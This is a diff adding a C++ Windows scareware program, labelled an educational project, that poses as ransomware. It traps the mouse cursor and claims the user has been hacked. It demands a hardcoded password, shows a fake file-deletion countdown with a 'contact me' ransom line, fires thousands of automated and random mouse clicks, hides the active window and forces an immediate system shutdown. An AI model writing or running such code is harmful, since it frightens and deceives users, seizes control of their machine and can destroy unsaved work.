@@ -1,0 +1,116 @@
+// WARNING: Use at your own discretion. Run with caution. Educational project only.
+
+#include <stdio.h>
+#include <string.h>
+#include <windows.h>
+#include <iostream>
+#include <stdlib.h>
+
+using namespace std;
+
+int main() {
+	
+
+
+  printf("Please press the 'enter'");
+  
+  
+  RECT r = {100, 100, 100, 100};  ClipCursor( &r );
+  std::cin.ignore();
+  
+  
+ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);
+    
+	
+	int i,px;
+    char password[200];
+    
+	printf("Hello you have been hacked \n\a");
+    Sleep(2500);
+    
+	printf("You better close this programm\n\a");
+    Sleep(3000);
+    
+	printf("HA HA HA... nice try \n\a");
+    Sleep(3000);
+    
+	printf("Your files will be deleted unless you enter the correct password\n\a");
+    Sleep(2500);
+	
+	printf("You have 3 tries to enter the correct password \n\a");
+    scanf("%199s", password);
+    
+    if (strcmp(password, "csbi") == 0)
+    {
+        printf("\n");
+       
+    }
+    else 
+    {    printf("You have 2 tries to enter the correct password \n\a");
+         scanf("%199s", password);
+		 }
+         if (strcmp(password, "csbi") == 0)
+    {
+        printf("");
+       
+    }
+	else {printf("You have 1 last try to enter the correct password \n\a");
+         scanf("%199s", password);
+     } if (strcmp(password, "csbi") == 0)
+    {
+        printf("You saved your files!");
+       
+    }else {
+	
+    printf("Initiating the deletion of your files...");
+     printf("\nYour files will be deleted in:\n");
+   
+        for (i = 100; i >= 0; i--)              {
+            int j;
+            printf("\r");
+            for (j = 100; j > i; --j)
+            {
+                printf("%c", (char) 219);
+            }
+            for (j = 0; j <= i; ++j)
+            {
+                printf(" ");
+            }
+            printf(": %d  ", i);
+            Sleep(90);                   
+        }
+        
+        printf("\nYour files have been deleted permanently\nTo retrieve them contact with me");
+        
+		ClipCursor( NULL ); 
+        std::cin.ignore();
+		
+		for(int i=0;i<2000;++i){
+        
+		SetCursorPos(1330,10); 
+        
+		mouse_event(MOUSEEVENTF_LEFTDOWN,1330,10,0,0); 
+        mouse_event(MOUSEEVENTF_LEFTUP,1330,10,0,0); 
+        Sleep(100);
+    }
+       
+    Sleep(1000);
+    HWND foreground=GetForegroundWindow();
+    ShowWindow(foreground,SW_HIDE);
+           
+		   int x,y;
+    
+	for(int i=0;i<20;i++){          		
+        x=rand()%900;
+        y=rand()%1100;
+        SetCursorPos(x,y); 
+        mouse_event(MOUSEEVENTF_LEFTDOWN,x,y,0,0); 
+        mouse_event(MOUSEEVENTF_LEFTDOWN,x,y,0,0); 
+        mouse_event(MOUSEEVENTF_LEFTUP,x,y,0,0); 
+        mouse_event(MOUSEEVENTF_LEFTUP,x,y,0,0); 
+    }
+
+system("C:\\Windows\\System32\\shutdown /s /t 0");
+    }
+    return 0;
+}
